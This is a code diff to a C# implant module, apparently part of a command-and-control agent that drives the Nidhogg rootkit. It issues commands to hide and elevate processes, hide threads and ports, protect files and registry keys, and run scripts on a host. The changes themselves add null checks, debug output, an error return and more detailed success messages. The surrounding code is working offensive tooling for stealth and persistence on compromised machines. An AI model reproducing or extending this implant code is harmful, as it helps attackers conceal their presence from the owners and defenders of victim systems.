@@ -23,6 +23,7 @@ namespace Agent
         }
         public async Task Execute(ServerJob job)
         {
+            Console.WriteLine(job.task.parameters);
             NidhoggArgs args = JsonSerializer.Deserialize<NidhoggArgs>(job.task.parameters);
 
             try
@@ -143,7 +144,10 @@ namespace Agent
             Marshal.FreeHGlobal(dataPtr);
 
             if (error != NidhoggApi.NidhoggErrorCodes.NIDHOGG_SUCCESS)
+            {
                 await this.messageManager.WriteLine($"Failed to execute script: {error}", task_id, true, "error");
+                return;
+            }
 
 
             await this.messageManager.WriteLine("Script executed succesfully", task_id, true);
@@ -152,8 +156,6 @@ namespace Agent
         {
             StringBuilder sb = new StringBuilder();
             NidhoggApi.NidhoggErrorCodes err;
-
-            if(protect)
 
             if (protect)
             {
@@ -179,7 +181,9 @@ namespace Agent
 
             sb.AppendLine("[+] Files after protect:");
 
-            foreach (var file in api.QueryFiles())
+            string[] files = api.QueryFiles() ?? new string[0];
+
+            foreach (var file in files)
             {
                 sb.AppendLine($"\t{file}");
             }
@@ -215,7 +219,9 @@ namespace Agent
 
             sb.AppendLine("[+] Protected Processes:");
 
-            foreach (var proc in api.QueryProtectedProcesses())
+            uint[] procs = api.QueryProtectedProcesses() ?? new uint[0];
+
+            foreach (var proc in procs)
             {
                 sb.AppendLine($"\t{proc}");
             }
@@ -228,6 +234,7 @@ namespace Agent
             NidhoggApi.NidhoggErrorCodes err;
             if (hide)
             {
+                Console.WriteLine(args.id);
                 err = api.ProcessHide(args.id);
 
                 if (!err.Equals(NidhoggApi.NidhoggErrorCodes.NIDHOGG_SUCCESS))
@@ -248,7 +255,7 @@ namespace Agent
                 }
             }
 
-            sb.AppendLine("Success.");
+            sb.AppendLine("Successfully modified visibility of process: " + args.id);
 
 
             await this.messageManager.WriteLine(sb.ToString(), task_id, true);
@@ -265,7 +272,7 @@ namespace Agent
                 return;
             }
 
-            sb.AppendLine("Success.");
+            sb.AppendLine("Successfully modified elevation of process: " + args.id);
             await this.messageManager.WriteLine(sb.ToString(), task_id, true);
         }
         private async Task ModifyThreadVisibility(NidhoggApi api, NidhoggArgs args, string task_id, bool hide)
@@ -292,7 +299,7 @@ namespace Agent
                     return;
                 }
             }
-            sb.AppendLine("Success.");
+            sb.AppendLine("Successfully modified visibility of thread: " + args.id);
             await this.messageManager.WriteLine(sb.ToString(), task_id, true); ;
         }
         private async Task ModifyThreadProtection(NidhoggApi api, NidhoggArgs args, string task_id, bool protect)
@@ -323,7 +330,9 @@ namespace Agent
 
             sb.AppendLine("[+] Protected Threads");
 
-            foreach (var tid in api.QueryProtectedThreads())
+            uint[] tids = api.QueryProtectedThreads() ?? new uint[0];
+
+            foreach (var tid in tids)
             {
                 sb.AppendLine("\t" +  tid);
             }
@@ -357,7 +366,8 @@ namespace Agent
             }
             sb.AppendLine("[+] Protected registry keys");
 
-            foreach (var val in api.QueryProtectedRegistryKeys())
+
+            foreach (var val in api.QueryProtectedRegistryKeys() ?? new string[0])
             {
                 sb.AppendLine("\t" + val);
             }
@@ -389,7 +399,7 @@ namespace Agent
             }
             sb.AppendLine("[+] Hidden registry keys");
 
-            foreach (var val in api.QueryHiddenRegistryKeys ())
+            foreach (var val in api.QueryHiddenRegistryKeys() ?? new string[0])
             {
                 sb.AppendLine("\t" + val);
             }
@@ -421,7 +431,7 @@ namespace Agent
             }
             sb.AppendLine("[+] Protected registry values");
 
-            foreach (var val in api.QueryProtectedRegistryValues())
+            foreach (var val in api.QueryProtectedRegistryValues() ?? new Dictionary<string, string>())
             {
                 sb.AppendLine("\t" + val);
             }
@@ -453,7 +463,7 @@ namespace Agent
             }
             sb.AppendLine("[+] Hidden registry values");
 
-            foreach (var val in api.QueryHiddenRegistryValues())
+            foreach (var val in api.QueryHiddenRegistryValues() ?? new Dictionary<string, string>())
             {
                 sb.AppendLine("\t" + val);
             }
@@ -569,7 +579,7 @@ namespace Agent
                 }
             }
             sb.AppendLine("Success");
-            foreach (var port in api.QueryHiddenPorts())
+            foreach (var port in api.QueryHiddenPorts() ?? new HiddenPort[0])
             {
                 
                 sb.AppendLine($"\tPort: {port.Port}\t Remote:{port.Remote}\t Tcp: {port.Type}");
